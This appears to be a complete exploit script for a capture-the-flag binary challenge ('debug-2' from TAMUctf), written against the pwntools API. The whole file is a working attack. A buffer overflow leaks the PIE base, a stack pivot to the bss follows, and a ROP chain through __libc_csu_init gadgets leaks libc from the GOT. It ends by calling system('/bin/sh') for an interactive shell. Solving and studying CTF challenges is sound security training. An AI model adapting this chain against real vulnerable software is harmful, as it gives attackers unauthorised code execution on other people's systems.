#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./debug-2_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-2")
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

# brva 0x11FF
brva 0x12DB
brva 0x11FF
b *menu+213

c
'''.format(**locals())

p = start()
# ==================== EXPLOIT ====================

def choice(option: int):
    sl(f'{option}'.encode())

def modify(s: bytes) -> bytes:
    s = bytearray(s)
    n = len(s)

    for i in range(n):
        if s[i] <= 96 or s[i] > 122:
            if 64 < s[i] <= 90:
                s[i] += 32  
        else:
            s[i] -= 32  

    return bytes(s)


def exploit():

    choice(1)
    s(b'.' * 88 + p8(0xb3))
    ru(b'.' * 88)
    exe_leak = u64(rl()[:-1].ljust(8, b'\0'))
    exe.address = exe_leak - exe.sym.main - 1
    slog('exe leak', exe_leak)
    slog('pie base', exe.address)

    rop = ROP(exe)
    leave_ret = exe.sym.menu + 212
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    call_r12_rbx = exe.sym.__libc_csu_init + 56         # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8+0x00]
    pop_7_regs = exe.sym.__libc_csu_init + 82           # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret


    '''
    <...>
    0x0000559d20b49438 <+56>:    mov    rdx,r15
    0x0000559d20b4943b <+59>:    mov    rsi,r14
    0x0000559d20b4943e <+62>:    mov    edi,r13d
    0x0000559d20b49441 <+65>:    call   QWORD PTR [r12+rbx*8]
    <...>
    0x0000559d20b49452 <+82>:    pop    rbx
    0x0000559d20b49453 <+83>:    pop    rbp
    0x0000559d20b49454 <+84>:    pop    r12    <--------------- Skip to this
    0x0000559d20b49456 <+86>:    pop    r13
    0x0000559d20b49458 <+88>:    pop    r14
    0x0000559d20b4945a <+90>:    pop    r15
    0x0000559d20b4945c <+92>:    ret
    '''

    rw_section = exe.address + 0x4800
    read_gadget = exe.sym.modify+24
    offset = 80
    
    choice(1)
    # fake_rbp = exe.bss(0x2f00)
    fake_rbp = exe.bss(0xf80) 
    slog('fake rbp', fake_rbp)
    data2 = flat({
        0x50: [
            fake_rbp, exe.sym.menu + 4
        ]
    }, filler=b'.') 

    input("1st")
    s(modify(data2))

    choice(1)
    rop1 = [
        pop_rdi, 
        exe.got.puts,
        exe.plt.puts,
        # exe.sym.pop_7_regs, 0, 0, # rbx, rbp
        pop_7_regs + 2, # ASSUME rbx = 0
        fake_rbp - 0x50 + 8*9, 0, # r12, r13
        fake_rbp - 0x50 + 8*9, 0x100, # r14, r15
        call_r12_rbx,
        exe.plt.read,
    ]

    data3 = flat({
        0: rop1,

        0x50: [

            fake_rbp - 0x50 - 8,
            leave_ret
        ]

    }, filler=b'.')
    input("2nd")
    s(modify(data3))


    ru(b'Your string: ')
    ru(b'Your string: ')
    ru(b'Your string: ')

    rb(7)
    puts = u64(rb(6).ljust(8, b'\0'))
    libc.address = puts - libc.sym.puts

    slog('puts', puts)
    slog('libc base', libc.address)

    rop2 = ROP(libc)
    rop2.raw(rop2.ret)
    rop2.system(next(libc.search(b'/bin/sh\0')))
    input("3rd")
    s(bytes(rop2))

    interactive()

if __name__ == '__main__':
    exploit()
